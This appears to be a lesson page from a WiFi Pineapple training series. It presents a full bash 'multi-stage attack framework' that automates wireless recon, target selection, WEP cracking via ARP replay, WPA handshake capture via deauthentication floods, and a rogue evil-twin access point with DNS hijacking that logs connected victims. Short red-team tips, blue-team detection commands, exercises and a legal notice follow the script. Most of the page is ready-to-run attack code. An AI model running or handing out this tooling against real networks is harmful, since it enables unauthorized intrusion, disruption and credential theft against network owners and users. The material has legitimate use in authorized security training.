# PP-A02: Multi-Stage Attack Framework

## Overview

| Attribute | Value |
|-----------|-------|
| **Payload ID** | PP-A02 |
| **Name** | Multi-Stage Attack Framework |
| **Category** | Advanced Attack |
| **Target** | Enterprise Networks |
| **Skill Level** | Advanced |
| **Risk Level** | High |

## Description

An orchestrated multi-stage wireless attack that progresses through reconnaissance, targeting, attack execution, and persistence. Each stage builds upon the previous, creating a comprehensive assessment workflow.

---

## Complete Payload

```bash
#!/bin/bash
#####################################################
# Payload: PP-A02 - Multi-Stage Attack Framework
# Target: Enterprise wireless networks
# Category: Advanced Attack
# Author: Security Trainer
# Version: 1.0.0
#
# WARNING: For authorized security testing only
#####################################################

# ============================================
# CONFIGURATION
# ============================================

# Operation settings
OPERATION_NAME="${1:-assessment}"
TARGET_SSID="${2:-}"
AUTO_ADVANCE="${3:-false}"

# Interfaces
MONITOR_IF="wlan1"
ATTACK_IF="wlan0"

# Directories
BASE_DIR="/sd/loot/multistage_$(date +%Y%m%d_%H%M%S)"
RECON_DIR="$BASE_DIR/01_recon"
TARGET_DIR="$BASE_DIR/02_targets"
ATTACK_DIR="$BASE_DIR/03_attacks"
PERSIST_DIR="$BASE_DIR/04_persistence"
LOG_FILE="$BASE_DIR/operation.log"

# Stage tracking
CURRENT_STAGE=0
STAGE_FILE="$BASE_DIR/.stage"

# ============================================
# LED & LOGGING
# ============================================

LED_BASE="/sys/class/leds"

led() {
    local color="$1"
    local state="$2"
    echo "$state" > "${LED_BASE}/pineapple:${color}:system/brightness" 2>/dev/null
}

led_stage() {
    local stage="$1"
    led "red" 0; led "green" 0; led "blue" 0; led "amber" 0

    case "$stage" in
        0) led "amber" 1 ;;                    # Init
        1) led "blue" 1 ;;                     # Recon
        2) led "amber" 1; led "blue" 1 ;;      # Target
        3) led "red" 1 ;;                      # Attack
        4) led "green" 1 ;;                    # Persist
        5) led "green" 1; led "blue" 1 ;;      # Complete
    esac
}

log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [STAGE $CURRENT_STAGE] $message" | tee -a "$LOG_FILE"
}

# ============================================
# STAGE 1: RECONNAISSANCE
# ============================================

stage_recon() {
    CURRENT_STAGE=1
    echo "$CURRENT_STAGE" > "$STAGE_FILE"
    led_stage 1

    log "=========================================="
    log "STAGE 1: RECONNAISSANCE"
    log "=========================================="

    mkdir -p "$RECON_DIR"

    # Enable monitor mode
    log "Enabling monitor mode on $MONITOR_IF"
    airmon-ng check kill >/dev/null 2>&1
    airmon-ng start "$MONITOR_IF" >/dev/null 2>&1
    MON="${MONITOR_IF}mon"

    # Phase 1.1: Passive network scan
    log "Phase 1.1: Scanning for networks (60s)..."
    timeout 60 airodump-ng \
        --band abg \
        --manufacturer \
        --wps \
        -w "$RECON_DIR/networks" \
        -o csv,kismet,pcap \
        "$MON" 2>/dev/null &
    wait $!

    # Phase 1.2: Probe harvesting
    log "Phase 1.2: Harvesting probe requests (120s)..."
    timeout 120 tcpdump -i "$MON" -n -e \
        'type mgt subtype probe-req' 2>/dev/null | \
        tee "$RECON_DIR/probes_raw.txt" | \
        while read line; do
            MAC=$(echo "$line" | grep -oE "[0-9a-f:]{17}" | head -1)
            SSID=$(echo "$line" | sed -n 's/.*Probe Request (\([^)]*\)).*/\1/p')
            [ -n "$MAC" ] && [ -n "$SSID" ] && echo "$MAC,$SSID"
        done > "$RECON_DIR/probes.csv" &
    PROBE_PID=$!

    sleep 120
    kill $PROBE_PID 2>/dev/null

    # Phase 1.3: Analyze results
    log "Phase 1.3: Analyzing reconnaissance data..."
    analyze_recon_data

    airmon-ng stop "$MON" >/dev/null 2>&1

    log "Reconnaissance complete"
    log "Networks found: $(wc -l < "$RECON_DIR/networks_parsed.csv" 2>/dev/null || echo 0)"
    log "Unique clients: $(cut -d',' -f1 "$RECON_DIR/probes.csv" 2>/dev/null | sort -u | wc -l)"

    return 0
}

analyze_recon_data() {
    local csv="$RECON_DIR/networks-01.csv"

    if [ ! -f "$csv" ]; then
        log "ERROR: No scan data found"
        return 1
    fi

    # Parse networks
    {
        echo "bssid,channel,privacy,cipher,auth,power,essid"
        grep -E "^[0-9A-F]" "$csv" | head -50 | while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lanip idlen essid key; do
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            privacy=$(echo "$privacy" | xargs)
            cipher=$(echo "$cipher" | xargs)
            auth=$(echo "$auth" | xargs)
            power=$(echo "$power" | xargs)
            essid=$(echo "$essid" | xargs)
            echo "$bssid,$channel,$privacy,$cipher,$auth,$power,$essid"
        done
    } > "$RECON_DIR/networks_parsed.csv"

    # Identify high-value targets
    {
        echo "=== High-Value Target Analysis ==="
        echo ""
        echo "WEP Networks (Easy Crack):"
        grep "WEP" "$RECON_DIR/networks_parsed.csv" || echo "  None found"
        echo ""
        echo "Open Networks (Evil Twin Candidates):"
        grep "OPN" "$RECON_DIR/networks_parsed.csv" || echo "  None found"
        echo ""
        echo "WPS Enabled (PIN Attack):"
        grep "WPS" "$RECON_DIR/networks-01.kismet.csv" 2>/dev/null | head -10 || echo "  None found"
        echo ""
        echo "Corporate Networks (High-Value):"
        grep -iE "(corp|secure|enterprise|internal)" "$RECON_DIR/networks_parsed.csv" || echo "  None found"
    } > "$RECON_DIR/target_analysis.txt"

    # Generate probe SSID list for evil twin
    cut -d',' -f2 "$RECON_DIR/probes.csv" 2>/dev/null | sort | uniq -c | sort -rn | head -20 > "$RECON_DIR/popular_ssids.txt"
}

# ============================================
# STAGE 2: TARGET SELECTION
# ============================================

stage_target() {
    CURRENT_STAGE=2
    echo "$CURRENT_STAGE" > "$STAGE_FILE"
    led_stage 2

    log "=========================================="
    log "STAGE 2: TARGET SELECTION"
    log "=========================================="

    mkdir -p "$TARGET_DIR"

    # Check if target was specified
    if [ -n "$TARGET_SSID" ]; then
        log "Using specified target: $TARGET_SSID"
        select_specific_target "$TARGET_SSID"
        return $?
    fi

    # Auto-select targets based on criteria
    log "Auto-selecting targets..."
    auto_select_targets

    return 0
}

select_specific_target() {
    local ssid="$1"
    local csv="$RECON_DIR/networks_parsed.csv"

    # Find target in scan results
    local target_info=$(grep "$ssid" "$csv" | head -1)

    if [ -z "$target_info" ]; then
        log "ERROR: Target SSID not found in scan results"
        return 1
    fi

    local bssid=$(echo "$target_info" | cut -d',' -f1)
    local channel=$(echo "$target_info" | cut -d',' -f2)
    local privacy=$(echo "$target_info" | cut -d',' -f3)

    log "Target found: $ssid"
    log "  BSSID: $bssid"
    log "  Channel: $channel"
    log "  Security: $privacy"

    # Save target info
    cat > "$TARGET_DIR/primary_target.conf" << EOF
TARGET_SSID="$ssid"
TARGET_BSSID="$bssid"
TARGET_CHANNEL="$channel"
TARGET_SECURITY="$privacy"
EOF

    # Determine attack vector
    determine_attack_vector "$privacy"

    return 0
}

auto_select_targets() {
    local csv="$RECON_DIR/networks_parsed.csv"

    # Priority 1: WEP networks
    local wep_target=$(grep "WEP" "$csv" | sort -t',' -k6 -rn | head -1)
    if [ -n "$wep_target" ]; then
        log "Found WEP target (Priority 1)"
        echo "$wep_target" > "$TARGET_DIR/wep_target.txt"
    fi

    # Priority 2: Open networks with clients
    local open_target=$(grep "OPN" "$csv" | sort -t',' -k6 -rn | head -1)
    if [ -n "$open_target" ]; then
        log "Found Open target (Priority 2)"
        echo "$open_target" > "$TARGET_DIR/open_target.txt"
    fi

    # Priority 3: WPA networks with weak signal (nearby)
    local wpa_target=$(grep "WPA" "$csv" | sort -t',' -k6 -rn | head -1)
    if [ -n "$wpa_target" ]; then
        log "Found WPA target (Priority 3)"
        echo "$wpa_target" > "$TARGET_DIR/wpa_target.txt"
    fi

    # Create attack plan
    generate_attack_plan

    return 0
}

determine_attack_vector() {
    local security="$1"

    case "$security" in
        *WEP*)
            echo "ATTACK_VECTOR=wep_crack" >> "$TARGET_DIR/primary_target.conf"
            echo "ATTACK_SCRIPT=attack_wep" >> "$TARGET_DIR/primary_target.conf"
            log "Attack vector: WEP Cracking"
            ;;
        *WPA*|*WPA2*)
            echo "ATTACK_VECTOR=wpa_handshake" >> "$TARGET_DIR/primary_target.conf"
            echo "ATTACK_SCRIPT=attack_wpa" >> "$TARGET_DIR/primary_target.conf"
            log "Attack vector: WPA Handshake Capture"
            ;;
        *OPN*)
            echo "ATTACK_VECTOR=evil_twin" >> "$TARGET_DIR/primary_target.conf"
            echo "ATTACK_SCRIPT=attack_eviltwin" >> "$TARGET_DIR/primary_target.conf"
            log "Attack vector: Evil Twin"
            ;;
        *)
            echo "ATTACK_VECTOR=evil_twin" >> "$TARGET_DIR/primary_target.conf"
            echo "ATTACK_SCRIPT=attack_eviltwin" >> "$TARGET_DIR/primary_target.conf"
            log "Attack vector: Evil Twin (default)"
            ;;
    esac
}

generate_attack_plan() {
    cat > "$TARGET_DIR/attack_plan.txt" << EOF
========================================
MULTI-STAGE ATTACK PLAN
Generated: $(date)
========================================

PHASE 1: Initial Access
-----------------------
EOF

    if [ -f "$TARGET_DIR/wep_target.txt" ]; then
        cat >> "$TARGET_DIR/attack_plan.txt" << EOF
[WEP Attack]
Target: $(cat "$TARGET_DIR/wep_target.txt" | cut -d',' -f7)
Method: IV collection + statistical crack
Est. Time: 5-30 minutes

EOF
    fi

    if [ -f "$TARGET_DIR/open_target.txt" ]; then
        cat >> "$TARGET_DIR/attack_plan.txt" << EOF
[Evil Twin Attack]
Target: $(cat "$TARGET_DIR/open_target.txt" | cut -d',' -f7)
Method: Clone AP + captive portal
Est. Time: Ongoing (client-dependent)

EOF
    fi

    if [ -f "$TARGET_DIR/wpa_target.txt" ]; then
        cat >> "$TARGET_DIR/attack_plan.txt" << EOF
[WPA Handshake Capture]
Target: $(cat "$TARGET_DIR/wpa_target.txt" | cut -d',' -f7)
Method: Deauth + 4-way handshake capture
Est. Time: 1-10 minutes

EOF
    fi

    cat >> "$TARGET_DIR/attack_plan.txt" << EOF
PHASE 2: Credential Harvesting
------------------------------
- Deploy captive portal on captured network
- Monitor traffic for cleartext credentials
- Log all client activity

PHASE 3: Persistence
--------------------
- Document access methods
- Create persistent backdoor configs
- Prepare for re-entry

EOF

    log "Attack plan generated: $TARGET_DIR/attack_plan.txt"
}

# ============================================
# STAGE 3: ATTACK EXECUTION
# ============================================

stage_attack() {
    CURRENT_STAGE=3
    echo "$CURRENT_STAGE" > "$STAGE_FILE"
    led_stage 3

    log "=========================================="
    log "STAGE 3: ATTACK EXECUTION"
    log "=========================================="

    mkdir -p "$ATTACK_DIR"

    # Load target config
    if [ -f "$TARGET_DIR/primary_target.conf" ]; then
        source "$TARGET_DIR/primary_target.conf"
    else
        # Use auto-selected targets
        execute_multi_attack
        return $?
    fi

    # Execute appropriate attack
    case "$ATTACK_VECTOR" in
        "wep_crack")
            attack_wep
            ;;
        "wpa_handshake")
            attack_wpa
            ;;
        "evil_twin")
            attack_eviltwin
            ;;
    esac

    return $?
}

attack_wep() {
    log "Executing WEP attack..."

    airmon-ng start "$MONITOR_IF" >/dev/null 2>&1
    MON="${MONITOR_IF}mon"

    # Start capture
    log "Starting IV capture on channel $TARGET_CHANNEL"
    airodump-ng -c "$TARGET_CHANNEL" \
        --bssid "$TARGET_BSSID" \
        -w "$ATTACK_DIR/wep_capture" \
        "$MON" &
    CAP_PID=$!

    sleep 10

    # ARP replay attack
    log "Starting ARP replay attack"
    aireplay-ng -3 -b "$TARGET_BSSID" "$MON" &
    REPLAY_PID=$!

    # Wait for sufficient IVs
    log "Collecting IVs (target: 50000+)..."
    local wait_time=0
    local max_wait=1800  # 30 minutes

    while [ $wait_time -lt $max_wait ]; do
        sleep 30
        wait_time=$((wait_time + 30))

        local iv_count=$(grep "IVs" "$ATTACK_DIR/wep_capture-01.csv" 2>/dev/null | tail -1 | cut -d',' -f11)
        log "IV count: ${iv_count:-0}"

        if [ "${iv_count:-0}" -gt 50000 ]; then
            log "Sufficient IVs collected"
            break
        fi
    done

    kill $CAP_PID $REPLAY_PID 2>/dev/null

    # Attempt crack
    log "Attempting to crack WEP key..."
    aircrack-ng -b "$TARGET_BSSID" "$ATTACK_DIR/wep_capture-01.cap" > "$ATTACK_DIR/wep_result.txt" 2>&1

    if grep -q "KEY FOUND" "$ATTACK_DIR/wep_result.txt"; then
        local key=$(grep "KEY FOUND" "$ATTACK_DIR/wep_result.txt" | grep -oE '\[[A-F0-9:]+\]')
        log "SUCCESS: WEP key found: $key"
        echo "WEP_KEY=$key" >> "$TARGET_DIR/primary_target.conf"
        return 0
    else
        log "WEP crack unsuccessful"
        return 1
    fi

    airmon-ng stop "$MON" >/dev/null 2>&1
}

attack_wpa() {
    log "Executing WPA handshake capture..."

    airmon-ng start "$MONITOR_IF" >/dev/null 2>&1
    MON="${MONITOR_IF}mon"

    # Start capture
    log "Starting handshake capture on channel $TARGET_CHANNEL"
    airodump-ng -c "$TARGET_CHANNEL" \
        --bssid "$TARGET_BSSID" \
        -w "$ATTACK_DIR/wpa_capture" \
        "$MON" &
    CAP_PID=$!

    sleep 10

    # Deauth bursts
    log "Sending deauthentication packets..."
    for i in {1..5}; do
        aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MON" >/dev/null 2>&1
        sleep 15
    done

    sleep 30
    kill $CAP_PID 2>/dev/null

    # Check for handshake
    if aircrack-ng "$ATTACK_DIR/wpa_capture-01.cap" 2>&1 | grep -q "1 handshake"; then
        log "SUCCESS: WPA handshake captured!"
        echo "HANDSHAKE_FILE=$ATTACK_DIR/wpa_capture-01.cap" >> "$TARGET_DIR/primary_target.conf"

        # Copy for offline cracking
        cp "$ATTACK_DIR/wpa_capture-01.cap" "$ATTACK_DIR/handshake_${TARGET_SSID}.cap"

        return 0
    else
        log "No handshake captured"
        return 1
    fi

    airmon-ng stop "$MON" >/dev/null 2>&1
}

attack_eviltwin() {
    log "Executing Evil Twin attack..."

    # Setup Evil Twin AP
    cat > /tmp/hostapd_twin.conf << EOF
interface=$ATTACK_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
wpa=0
EOF

    # Setup DHCP
    cat > /tmp/dnsmasq_twin.conf << EOF
interface=$ATTACK_IF
bind-interfaces
dhcp-range=192.168.4.100,192.168.4.200,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
address=/#/192.168.4.1
log-queries
log-facility=$ATTACK_DIR/dns.log
dhcp-leasefile=$ATTACK_DIR/leases.txt
EOF

    # Configure interface
    ip addr flush dev "$ATTACK_IF" 2>/dev/null
    ip addr add 192.168.4.1/24 dev "$ATTACK_IF"
    ip link set "$ATTACK_IF" up

    # Start services
    hostapd -B /tmp/hostapd_twin.conf
    dnsmasq -C /tmp/dnsmasq_twin.conf

    log "Evil Twin AP active: $TARGET_SSID"

    # Monitor for clients
    log "Monitoring for victim connections..."
    local client_count=0
    local wait_time=0
    local max_wait=1800  # 30 minutes

    while [ $wait_time -lt $max_wait ]; do
        sleep 30
        wait_time=$((wait_time + 30))

        local new_count=$(wc -l < "$ATTACK_DIR/leases.txt" 2>/dev/null || echo 0)
        if [ "$new_count" -gt "$client_count" ]; then
            log "New client connected! Total: $new_count"
            client_count=$new_count
        fi

        # Check if we have victims
        if [ "$client_count" -gt 0 ]; then
            log "Clients captured, continuing attack..."
        fi
    done

    return 0
}

execute_multi_attack() {
    log "Executing multi-target attack..."

    # WEP first (if available)
    if [ -f "$TARGET_DIR/wep_target.txt" ]; then
        source "$TARGET_DIR/wep_target.txt" 2>/dev/null || true
        TARGET_BSSID=$(cat "$TARGET_DIR/wep_target.txt" | cut -d',' -f1)
        TARGET_CHANNEL=$(cat "$TARGET_DIR/wep_target.txt" | cut -d',' -f2)
        TARGET_SSID=$(cat "$TARGET_DIR/wep_target.txt" | cut -d',' -f7)
        attack_wep
    fi

    # WPA handshake
    if [ -f "$TARGET_DIR/wpa_target.txt" ]; then
        TARGET_BSSID=$(cat "$TARGET_DIR/wpa_target.txt" | cut -d',' -f1)
        TARGET_CHANNEL=$(cat "$TARGET_DIR/wpa_target.txt" | cut -d',' -f2)
        TARGET_SSID=$(cat "$TARGET_DIR/wpa_target.txt" | cut -d',' -f7)
        attack_wpa
    fi

    return 0
}

# ============================================
# STAGE 4: PERSISTENCE
# ============================================

stage_persist() {
    CURRENT_STAGE=4
    echo "$CURRENT_STAGE" > "$STAGE_FILE"
    led_stage 4

    log "=========================================="
    log "STAGE 4: PERSISTENCE PREPARATION"
    log "=========================================="

    mkdir -p "$PERSIST_DIR"

    # Generate connection profiles
    if [ -f "$TARGET_DIR/primary_target.conf" ]; then
        source "$TARGET_DIR/primary_target.conf"
        generate_connection_profile
    fi

    # Generate operation report
    generate_final_report

    return 0
}

generate_connection_profile() {
    log "Generating connection profiles..."

    # WPA Supplicant config
    cat > "$PERSIST_DIR/wpa_supplicant.conf" << EOF
# Auto-generated connection profile
# Target: $TARGET_SSID
# Generated: $(date)

network={
    ssid="$TARGET_SSID"
    # Add PSK after cracking handshake
    # psk="password_here"
    key_mgmt=WPA-PSK
}
EOF

    # NetworkManager config
    cat > "$PERSIST_DIR/nm_connection.conf" << EOF
[connection]
id=$TARGET_SSID
uuid=$(uuidgen 2>/dev/null || echo "00000000-0000-0000-0000-000000000000")
type=wifi

[wifi]
ssid=$TARGET_SSID
mode=infrastructure

[wifi-security]
key-mgmt=wpa-psk
# psk=password_here

[ipv4]
method=auto

[ipv6]
method=auto
EOF

    log "Connection profiles saved to $PERSIST_DIR"
}

generate_final_report() {
    log "Generating final report..."

    cat > "$BASE_DIR/OPERATION_REPORT.txt" << EOF
========================================
MULTI-STAGE ATTACK OPERATION REPORT
========================================

Operation: $OPERATION_NAME
Started: $(head -1 "$LOG_FILE" | cut -d']' -f1 | tr -d '[')
Completed: $(date '+%Y-%m-%d %H:%M:%S')

========================================
STAGE 1: RECONNAISSANCE
========================================
Networks discovered: $(wc -l < "$RECON_DIR/networks_parsed.csv" 2>/dev/null || echo 0)
Unique clients detected: $(cut -d',' -f1 "$RECON_DIR/probes.csv" 2>/dev/null | sort -u | wc -l)
Probe requests captured: $(wc -l < "$RECON_DIR/probes.csv" 2>/dev/null || echo 0)

========================================
STAGE 2: TARGET SELECTION
========================================
$(cat "$TARGET_DIR/attack_plan.txt" 2>/dev/null || echo "No targets selected")

========================================
STAGE 3: ATTACK RESULTS
========================================
EOF

    # Add attack results
    if [ -f "$ATTACK_DIR/wep_result.txt" ]; then
        echo "WEP Attack:" >> "$BASE_DIR/OPERATION_REPORT.txt"
        grep "KEY FOUND" "$ATTACK_DIR/wep_result.txt" >> "$BASE_DIR/OPERATION_REPORT.txt" 2>/dev/null || echo "  Unsuccessful" >> "$BASE_DIR/OPERATION_REPORT.txt"
    fi

    if [ -f "$ATTACK_DIR/wpa_capture-01.cap" ]; then
        echo "WPA Handshake:" >> "$BASE_DIR/OPERATION_REPORT.txt"
        if aircrack-ng "$ATTACK_DIR/wpa_capture-01.cap" 2>&1 | grep -q "1 handshake"; then
            echo "  Captured successfully" >> "$BASE_DIR/OPERATION_REPORT.txt"
        else
            echo "  Not captured" >> "$BASE_DIR/OPERATION_REPORT.txt"
        fi
    fi

    if [ -f "$ATTACK_DIR/leases.txt" ]; then
        echo "Evil Twin Victims:" >> "$BASE_DIR/OPERATION_REPORT.txt"
        echo "  $(wc -l < "$ATTACK_DIR/leases.txt") clients connected" >> "$BASE_DIR/OPERATION_REPORT.txt"
    fi

    cat >> "$BASE_DIR/OPERATION_REPORT.txt" << EOF

========================================
FILES
========================================
$(find "$BASE_DIR" -type f -name "*.cap" -o -name "*.csv" -o -name "*.txt" | sort)

========================================
RECOMMENDATIONS
========================================
1. Review captured handshakes with aircrack-ng
2. Analyze probe requests for additional targets
3. Use captured credentials for further access
4. Document findings for report

EOF

    log "Report saved: $BASE_DIR/OPERATION_REPORT.txt"
}

# ============================================
# CLEANUP
# ============================================

cleanup() {
    log "Cleaning up..."

    # Stop services
    pkill hostapd 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill airodump-ng 2>/dev/null
    pkill aireplay-ng 2>/dev/null

    # Stop monitor mode
    airmon-ng stop "${MONITOR_IF}mon" 2>/dev/null
    airmon-ng stop "${ATTACK_IF}mon" 2>/dev/null

    # Reset interfaces
    ip addr flush dev "$ATTACK_IF" 2>/dev/null

    led_stage 5
    log "Operation complete"
    log "Results saved to: $BASE_DIR"

    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# MAIN ORCHESTRATOR
# ============================================

main() {
    log "=========================================="
    log "PP-A02: Multi-Stage Attack Framework"
    log "Operation: $OPERATION_NAME"
    log "=========================================="

    led_stage 0
    mkdir -p "$BASE_DIR"

    # Stage 1: Reconnaissance
    stage_recon
    if [ "$AUTO_ADVANCE" = "true" ]; then
        log "Auto-advancing to Stage 2..."
    else
        log "Stage 1 complete. Review $RECON_DIR before continuing."
        log "Run with AUTO_ADVANCE=true for automatic progression."
        read -p "Press Enter to continue to Stage 2..." || true
    fi

    # Stage 2: Target Selection
    stage_target
    if [ "$AUTO_ADVANCE" = "true" ]; then
        log "Auto-advancing to Stage 3..."
    else
        log "Stage 2 complete. Review $TARGET_DIR before continuing."
        read -p "Press Enter to continue to Stage 3..." || true
    fi

    # Stage 3: Attack Execution
    stage_attack

    # Stage 4: Persistence
    stage_persist

    # Complete
    led_stage 5
    log "=========================================="
    log "OPERATION COMPLETE"
    log "Results: $BASE_DIR"
    log "=========================================="
}

# ============================================
# EXECUTE
# ============================================

main "$@"
```

---

## Line-by-Line Breakdown

### Stage Architecture

| Stage | Function | Purpose |
|-------|----------|---------|
| 0 | Initialization | Setup directories, LED status |
| 1 | `stage_recon()` | Passive network/client scanning |
| 2 | `stage_target()` | Analyze and select targets |
| 3 | `stage_attack()` | Execute appropriate attack |
| 4 | `stage_persist()` | Generate profiles and reports |

### Attack Vector Selection (Lines 210-240)

```bash
case "$security" in
    *WEP*)      # Weak encryption - crack it
    *WPA*)      # Strong encryption - capture handshake
    *OPN*)      # Open - Evil Twin attack
esac
```

### Multi-Attack Execution (Lines 380-410)

Automatically executes:
1. WEP cracking (if targets exist)
2. WPA handshake capture
3. Evil Twin deployment

---

## Red Team Perspective

### Operational Workflow

```
┌─────────────────────────────────────────────────────────────┐
│                MULTI-STAGE WORKFLOW                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   STAGE 1          STAGE 2          STAGE 3          STAGE 4│
│   ────────         ────────         ────────         ────────│
│                                                              │
│   ┌────────┐      ┌────────┐      ┌────────┐      ┌────────┐│
│   │ RECON  │─────▶│ TARGET │─────▶│ ATTACK │─────▶│PERSIST ││
│   └────────┘      └────────┘      └────────┘      └────────┘│
│       │               │               │               │      │
│       ▼               ▼               ▼               ▼      │
│   Scan APs       Select best    Execute plan    Save access │
│   Find clients   Plan attack    Capture creds   Gen reports │
│   Harvest SSIDs  Determine      Evil Twin                   │
│                  vectors        WEP/WPA crack               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Tactical Considerations

1. **Timing**: Run recon during busy hours
2. **Positioning**: Strong signal to targets
3. **OPSEC**: Limit deauth to avoid detection
4. **Documentation**: Preserve all evidence

---

## Blue Team Perspective

### Detection Points

| Stage | Detection Method |
|-------|------------------|
| Recon | Monitor mode detection |
| Target | N/A (passive analysis) |
| Attack | Deauth storms, rogue APs |
| Persist | Unauthorized connections |

### Monitoring Commands

```bash
# Detect monitor mode interfaces
iw dev | grep "type monitor"

# Detect deauth floods
airodump-ng wlan0mon --berlin 120 | grep "Deauth"

# Detect rogue APs
# Compare known BSSID list with scan results

# Log analysis for suspicious activity
grep -E "deauth|disassoc" /var/log/wireless.log
```

---

## Practice Exercises

### Exercise 1: Stage Customization
Add a new stage between Attack and Persist for "Credential Validation".

### Exercise 2: Target Scoring
Implement a scoring system that ranks targets by:
- Security strength
- Signal strength
- Client count

### Exercise 3: Parallel Attacks
Modify to run multiple attacks simultaneously using background processes.

---

## Legal & Ethical Notice

This framework is for **authorized security assessments only**. Unauthorized use is illegal. Always:
- Have written authorization
- Document scope limitations
- Protect all captured data
- Report findings responsibly

---

[← PP-A01 Credential Harvester](PP-A01_Credential_Harvester.md) | [Back to Advanced](README.md) | [Next: PP-A03 Automated WPA Cracker →](PP-A03_Automated_WPA_Cracker.md)
